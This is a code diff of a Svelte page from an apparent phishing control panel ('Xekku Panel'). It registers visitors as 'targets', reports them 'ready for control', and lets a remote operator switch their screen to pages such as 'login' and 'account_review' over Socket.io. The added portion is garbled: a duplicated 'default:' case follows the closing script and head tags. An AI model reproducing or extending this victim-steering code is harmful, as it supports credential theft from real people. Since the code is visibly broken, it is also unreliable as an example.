@@ -198,58 +198,6 @@
             });
         }
     }
-                
-                console.log('🎯 Target ID assigned:', targetID);
-                console.log('📡 Target status: Online and ready for control');
-                
-                // Set initial page from server
-                if (data.start_page) {
-                    currentPage = data.start_page;
-                    console.log('📄 Initial page set to:', currentPage);
-                }
-                
-                // Update status periodically
-                setInterval(() => {
-                    socket.emit('updateStatus', {
-                        targetID: targetID,
-                        status: 'Online',
-                        currentPage: currentPage
-                    });
-                }, 5000); // Update every 5 seconds
-            });
-            
-            socket.on('action', (data) => {
-                console.log('🎮 RECEIVED ACTION:', data);
-                console.log('   Action type:', data.action);
-                console.log('   Custom URL:', data.customUrl);
-                console.log('   Target ID:', targetID);
-                console.log('   Timestamp:', new Date().toISOString());
-                handleAction(data.action, data.customUrl);
-            });
-            
-            socket.on('disconnect', () => {
-                console.log('Disconnected from Socket.io server');
-                connectionStatus = 'Offline';
-            });
-            
-            socket.on('connect_error', (error) => {
-                console.error('Socket.io connection error:', error);
-                connectionStatus = 'Connection Error';
-                isLoading = false;
-            });
-            
-        } catch (error) {
-            console.error('Failed to initialize socket:', error);
-            connectionStatus = 'Failed to Connect';
-            isLoading = false;
-        }
-    });
-    
-    onDestroy(() => {
-        if (socket) {
-            socket.disconnect();
-        }
-    });
     
     function handleAction(action, customUrl) {
         console.log(`🎯 HANDLING ACTION: ${action}`, customUrl);
@@ -278,6 +226,38 @@
             case 'set_page':
                 console.log('📄 Setting page to:', customUrl || 'account_review');
                 currentPage = customUrl || 'account_review';
+                if (socket && targetID) {
+                    socket.emit('updateStatus', {
+                        targetID: targetID,
+                        status: 'Online',
+                        currentPage: currentPage
+                    });
+                }
+                break;
+            default:
+                // Handle page changes (login, account_review, etc.)
+                console.log('📄 Changing page to:', action);
+                currentPage = action;
+                if (socket && targetID) {
+                    socket.emit('updateStatus', {
+                        targetID: targetID,
+                        status: 'Online',
+                        currentPage: currentPage
+                    });
+                }
+                break;
+        }
+    }
+</script>
+
+<svelte:head>
+    <title>Welcome | Xekku Panel</title>
+    <meta name="description" content="Welcome to Xekku Panel" />
+</svelte:head>
+            default:
+                // Handle page changes (login, account_review, etc.)
+                console.log('📄 Changing page to:', action);
+                currentPage = action;
                 if (socket && targetID) {
                     socket.emit('updateStatus', {
                         targetID: targetID,
